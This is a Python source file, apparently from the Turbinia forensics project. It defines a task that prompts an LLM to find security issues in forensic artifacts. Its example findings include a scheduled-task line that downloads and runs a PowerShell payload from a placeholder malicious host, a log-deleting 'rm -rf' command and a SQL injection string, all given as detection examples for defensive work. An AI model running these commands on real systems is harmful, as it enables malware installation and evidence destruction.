# -*- coding: utf-8 -*-
# Copyright 2018 Google Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""Task for analyzing artifacts using LLM analyzer."""

import gzip
import os

from turbinia import evidence as evidence_module
from turbinia.lib.llm_libs import llm_client
from turbinia import config as turbinia_config
from turbinia import workers

CONTEXT_PROMPT = """
I'm a security engineer investigating a potential cybersecurity incident and need your help analyzing 
a forensics artifact. I'll provide the artifact separately. Focus on identifying concerning security 
findings. A security finding can be any of:

* **Vulnerable Configurations:** Settings that create weaknesses attackers could exploit (e.g., Docker daemon allowing anonymous connections)
* **Suspicious Activity:**  Entries that seem unusual, malformed, or could indicate malicious behavior, for example:
    * **Persistence:** Attempts to establish a foothold on the system (e.g., modifying startup scripts).
    * **Malware Installation:**  Downloading and executing suspicious executables
    * **Command and Control Communication:**  Reaching out to external servers known for malicious activity.

** IMPORTANT** Your response should only include details about findings. If no findings reply 
with no security findings found. Response should be brief, short and related to a finding.
"""
REQUEST_PROMPT = """
**Artifact Name:** {artifact_name}

Please analyze this artifact based on the instructions from the previous prompt. For each finding, briefly provide:

* **What:** A concise description.
* **Why:** A short explanation of the potential security risk. 

**Examples of findings:**
* **Bash History:** `rm -rf /var/log` (Attempts to delete critical log files)
* **SSH Logs:** 
    * Successful login for ‘root’ from infrequent IP address 203.0.113.1 
    * Successful login for 'webadmin' after 5 failed attempts from IP 123.45.67.89 
* **Web Server Logs:**  GET requests with SQL injection patterns like `/products?id=1; DROP TABLE users`
* **Sudoers File:**  `web_team ALL=(ALL:ALL) NOPASSWD: ALL` (Excessive privileges)
* **Apache Config:** `Options +FollowSymLinks` (Potential directory traversal risk)
* **Unexpected Scheduled Tasks:** `schtasks /create /tn "WindowsUpdates" /tr "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')" /sc daily /st 02:00` (downloading malware)
* **Firewall Config:**  `ACCEPT INPUT from 0.0.0.0/0 to any port 22` (SSH open to the world)
* **Password file:**  `admin:admin123` (Simple, default password)
* **SNMP Config:** Community string 'public' (Easily guessable)
* **Web App Config:**  Debug mode enabled in production  
"""
CONTENT_PROMPT = """
"**Artifact Content (Part {i} of {chunks_len}):** \n```\n{chunk}\n```"
"""
PRIORITY_PROMPT = """
Please set the severity of the security findings, your response must be a single word from the following list: [LOW, MEDIUM, HIGH, CRITICAL]

**Examples answer:**
CRITICAL
"""
SUMMARY_PROMPT = """
Please summarize all security findings in a single statement, keep summary short and don't describe the summary
"""


class LLMAnalyzerTask(workers.TurbiniaTask):
  """LLM analysis task for selected history, logs and config files."""

  # Input Evidence ExportedFileArtifactLLM does not need to be preprocessed.
  REQUIRED_STATES = []

  def run(self, evidence, result):
    """Run the Wordpress access log analysis worker.

    Args:
       evidence (Evidence object):  The evidence to process
       result (TurbiniaTaskResult): The object to place task results into.

    Returns:
      TurbiniaTaskResult object.
    """

    result.log(
        f"Running LLMAnalyzerTask task on {evidence.artifact_name} {evidence.local_path}"
    )
    # Where to store the resulting output file.
    output_file_name = f"{evidence.artifact_name}-llm_analysis.txt"
    output_file_path = os.path.join(self.output_dir, output_file_name)
    result.log(f"LLMAnalyzerTask output_file_path {output_file_path}")
    # Set the output file as the data source for the output evidence.
    output_evidence = evidence_module.ReportText(source_path=output_file_path)

    # Change open function if file is GZIP compressed.
    open_function = open
    if evidence.local_path.lower().endswith("gz"):
      open_function = gzip.open

    # Read the input file
    try:
      with open_function(evidence.local_path, "rb") as input_file:
        artifact_content = input_file.read().decode("utf-8")
    except UnicodeDecodeError:
      result.log(
          f"UnicodeDecodeError: Artifact {evidence.local_path} not UTF-8 encoded"
      )

    if not artifact_content:
      result.log(
          f"Artifact {evidence.artifact_name} has empty content or not UTF-8 encoded"
      )
      raise ValueError(
          f"Artifact {evidence.artifact_name} has empty content or not UTF-8 encoded"
      )
    (report, priority, summary) = self.llm_analyze_artifact(
        artifact_content, evidence.artifact_name)
    output_evidence.text_data = report
    result.report_data = report
    result.report_priority = priority

    # Write the report to the output file.
    with open(output_file_path, "wb") as fh:
      fh.write(output_evidence.text_data.encode("utf-8"))

    # Add the resulting evidence to the result object.
    result.add_evidence(output_evidence, evidence.config)
    result.close(self, success=True, status=summary)
    return result

  def llm_analyze_artifact(self, artifact_content, artifact_name):
    """Analyses forensics artifact using GenAI.

    Args:
      artifact_content (str): artifact text content.
      artifact_name (str): artifact name.

    Returns:
      Tuple(
        report(str): The report data
        priority(turbinia.workers.Priority): The priority of findings
        summary(str): The report summary
      )
    """
    report = ""
    client = llm_client.TurbiniaLLMClient()
    (_, history_session) = client.prompt_with_history(CONTEXT_PROMPT)
    (_, history_session) = client.prompt_with_history(
        REQUEST_PROMPT.format(artifact_name=artifact_name), history_session)
    # Max input token limit of Gemini 1.5 Pro is 2,097,152, see
    # https://cloud.google.com/vertex-ai/generative-ai/docs/learn/models
    # This will make sure we send the full content of a very long config file
    if turbinia_config.LLM_PROVIDER == "vertexai":
      chunks = self.split_into_chunks(artifact_content, max_size=2090000)
    else:
      chunks = [artifact_content]
    for i, chunk in enumerate(chunks):
      content_prompt_chunk = CONTENT_PROMPT.format(
          i=i + 1, chunks_len=len(chunks), chunk=chunk)
      # Send 'prompt' to the LLM model
      (chunk_report, history_session) = client.prompt_with_history(
          content_prompt_chunk, history_session)
      report += (
          chunk_report.rstrip().strip() if not report else "\n" +
          chunk_report.rstrip().strip())
    (priority, history_session) = client.prompt_with_history(
        PRIORITY_PROMPT, history_session)
    (summary, _) = client.prompt_with_history(SUMMARY_PROMPT, history_session)
    if "CRITICAL" in priority.upper():
      priority = workers.Priority.CRITICAL
    elif "HIGH" in priority.upper():
      priority = workers.Priority.HIGH
    elif "MEDIUM" in priority.upper():
      priority = workers.Priority.MEDIUM
    elif "LOW" in priority.upper():
      priority = workers.Priority.LOW
    else:
      # Default to high to err on the side of cautious
      priority = workers.Priority.HIGH
    return (report.rstrip().strip(), priority, summary.replace("\n", ""))

  def split_into_chunks(self, text, max_size):
    """Splits text into chunks respecting token limits."""
    words = text.split()
    chunks = []
    current_chunk = ""
    # Multiplying token count by 4 as one token is about 4 chars
    max_size = max_size * 4
    # Some config files my have very long lines (e.g. base64 strings) which
    # will be considered as one word after split and needs to be chunked to
    # multiple words.
    words = self.chunk_long_strings_config_file(words, max_size)
    # Add words to each chunk as long as less than or equal the max_size.
    for word in words:
      if len(current_chunk) + len(word) <= max_size:
        current_chunk += " " + word
      else:
        chunks.append(current_chunk.strip())
        current_chunk = word

    if current_chunk.strip():
      chunks.append(current_chunk.strip())
    return chunks

  def chunk_long_strings_config_file(self, words, max_size):
    """Chunks long strings in config files."""
    result = []
    for word in words:
      if len(word) > max_size:
        while len(word) > max_size:
          result.append(word[:max_size])
          word = word[max_size:]
        if word:
          result.append(word)
      else:
        result.append(word)
    return result
